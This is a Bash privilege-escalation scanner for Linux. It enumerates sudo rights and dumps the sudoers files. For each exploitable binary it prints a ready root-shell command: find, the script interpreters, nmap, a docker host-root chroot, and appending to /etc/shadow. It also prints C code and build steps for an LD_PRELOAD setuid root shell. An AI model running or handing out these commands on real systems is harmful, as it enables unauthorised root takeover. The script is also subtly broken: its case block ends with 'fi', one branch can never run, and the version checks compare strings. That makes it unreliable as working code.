#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║         SUDO & ENV EXPLOIT SCANNER       ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"

echo -e "\n${BLUE}[+] Checking sudo permissions${NC}"
sudo -l > /tmp/sudo_info.txt 2>&1
cat /tmp/sudo_info.txt

echo -e "\n${BLUE}[+] Analyzing sudo configuration${NC}"
sudo_check=$(sudo -l 2>&1)

echo -e "\n${YELLOW}[+] Checking for ALL command${NC}"
if echo "$sudo_check" | grep -q "(ALL) ALL"; then
    echo -e "${RED}[!] Full sudo access detected!${NC}"
    echo -e "${GREEN}    Run: sudo su${NC}"
    echo -e "${GREEN}    Or: sudo -i${NC}"
fi

echo -e "\n${YELLOW}[+] Checking for NOPASSWD${NC}"
if echo "$sudo_check" | grep -q "NOPASSWD"; then
    echo -e "${RED}[!] NOPASSWD configured!${NC}"
    echo "$sudo_check" | grep "NOPASSWD"
fi

echo -e "\n${YELLOW}[+] Checking for specific binary permissions${NC}"
binaries=("awk" "bash" "cat" "chmod" "chown" "cp" "curl" "dd" "diff" "dmesg" "docker" "ed" "emacs" "env" "find" "ftp" "gdb" "grep" "head" "htop" "ifconfig" "iptables" "journalctl" "less" "lua" "more" "nano" "nc" "nmap" "node" "openssl" "perl" "php" "python" "python3" "ruby" "sed" "sh" "socat" "ssh" "strace" "su" "sudo" "tail" "tar" "tcpdump" "tmux" "uniq" "vi" "vim" "watch" "wget" "xargs" "xxd" "zip" "zsh")

for bin in "${binaries[@]}"; do
    if echo "$sudo_check" | grep -q "$bin"; then
        echo -e "${RED}[!] Sudo access to: $bin${NC}"
        
        case $bin in
            bash|sh|zsh)
                echo -e "${GREEN}    Exploit: sudo -u root $bin -p${NC}"
                ;;
            python|python3|perl|ruby)
                echo -e "${GREEN}    Exploit: sudo -u root $bin -c 'import os; os.system(\"/bin/sh\")'${NC}"
                ;;
            nmap)
                echo -e "${GREEN}    Exploit: sudo -u root nmap --interactive${NC}"
                echo -e "${GREEN}    Then: !sh${NC}"
                ;;
            vim|nano|emacs)
                echo -e "${GREEN}    Exploit: sudo -u root $bin /etc/shadow${NC}"
                echo -e "${GREEN}    Then: :!sh (for vim)${NC}"
                ;;
            find)
                echo -e "${GREEN}    Exploit: sudo -u root find / -exec /bin/sh \; -quit${NC}"
                ;;
            cat)
                echo -e "${GREEN}    Exploit: sudo -u root cat /etc/shadow${NC}"
                ;;
            tee)
                echo -e "${GREEN}    Exploit: echo 'hacker:$6$hash...' | sudo -u root tee -a /etc/shadow${NC}"
                ;;
            wget|curl)
                echo -e "${GREEN}    Exploit: Download and execute shell${NC}"
                ;;
            docker)
                echo -e "${RED}[!] Docker access - container escape possible!${NC}"
                echo -e "${GREEN}    Exploit: sudo -u root docker run -v /:/mnt -it ubuntu chroot /mnt${NC}"
                ;;
        fi
    fi
done

echo -e "\n${BLUE}[+] Checking for LD_PRELOAD privilege escalation${NC}"
if echo "$sudo_check" | grep -qi "LD_PRELOAD" || echo "$sudo_check" | grep -qi "env_keep"; then
    echo -e "${RED}[!] LD_PRELOAD might be preserved!${NC}"
    echo -e "${GREEN}    Create shared library and load via sudo${NC}"
    
cat << 'EOF'
Example LD_PRELOAD exploit:
1. Create library code:
   #include <stdlib.h>
   #include <unistd.h>
   void _init() { setuid(0); system("/bin/sh"); }

2. Compile:
   gcc -fPIC -shared -o /tmp/lib.so lib.c

3. Execute:
   sudo LD_PRELOAD=/tmp/lib.so <command>
EOF
fi

echo -e "\n${BLUE}[+] Checking sudoers file${NC}"
if [ -r /etc/sudoers ]; then
    echo -e "${GREEN}/etc/sudoers is readable${NC}"
    cat /etc/sudoers
else
    echo -e "${YELLOW}/etc/sudoers is not readable${NC}"
fi

echo -e "\n${BLUE}[+] Checking for sudoers.d files${NC}"
if [ -d /etc/sudoers.d ]; then
    echo -e "${GREEN}Scanning /etc/sudoers.d${NC}"
    for file in /etc/sudoers.d/*; do
        if [ -f "$file" ] && [ -r "$file" ]; then
            echo -e "${YELLOW}Reading: $file${NC}"
            cat "$file"
        fi
    done
fi

echo -e "\n${BLUE}[+] Checking environment variables${NC}"
echo "PATH: $PATH"
echo "LD_PRELOAD: ${LD_PRELOAD:-not set}"
echo "LD_LIBRARY_PATH: ${LD_LIBRARY_PATH:-not set}"
echo "PYTHONPATH: ${PYTHONPATH:-not set}"
echo "RUBYLIB: ${RUBYLIB:-not set}"

echo -e "\n${BLUE}[+] Checking for writable directories in PATH${NC}"
IFS=':' read -ra PATH_DIRS <<< "$PATH"
for dir in "${PATH_DIRS[@]}"; do
    if [ -d "$dir" ]; then
        if [ -w "$dir" ]; then
            echo -e "${RED}[!] Writable PATH directory: $dir${NC}"
            echo -e "${GREEN}    Can create malicious binary to hijack commands${NC}"
        fi
    fi
done

echo -e "\n${BLUE}[+] Checking for script execution as root${NC}"
script_ext=(".sh" ".py" ".pl" ".rb" ".php")
for ext in "${script_ext[@]}"; do
    if echo "$sudo_check" | grep -q "$ext"; then
        echo -e "${YELLOW}[!] Script with extension $ext can run as root${NC}"
        echo "$sudo_check" | grep "$ext"
    fi
done

echo -e "\n${BLUE}[+] Checking for wildcard injection${NC}"
if echo "$sudo_check" | grep -q "*"; then
    echo -e "${YELLOW}[!] Wildcard usage detected - possible tar/zip injection${NC}"
    echo "$sudo_check" | grep "*"
fi

echo -e "\n${BLUE}[+] Checking current user groups${NC}"
groups
echo -e "\n${YELLOW}Privileged groups to look for:${NC}"
echo "    - wheel"
echo "    - sudo"
echo "    - admin"
echo "    - root"
echo "    - docker"
echo "    - lxd"
echo "    - lxc"

echo -e "\n${BLUE}[+] Checking for sudo version vulnerabilities${NC}"
if command -v sudo &> /dev/null; then
    sudo_version=$(sudo -V | grep "Sudo version" | awk '{print $3}')
    echo -e "${GREEN}Sudo version: $sudo_version${NC}"
    
    if [[ "$sudo_version" < "1.8.28" ]]; then
        echo -e "${RED}[!] Check for CVE-2019-14287 (sudo 1.8.28-)${NC}"
    fi
    
    if [[ "$sudo_version" > "1.8.2" ]] && [[ "$sudo_version" < "1.8.31p2" ]]; then
        echo -e "${RED}[!] Check for CVE-2019-18634 (sudo 1.7.1 to 1.8.31p2)${NC}"
    fi
fi

echo -e "\n${GREEN}[+] Sudo and environment scan complete${NC}"
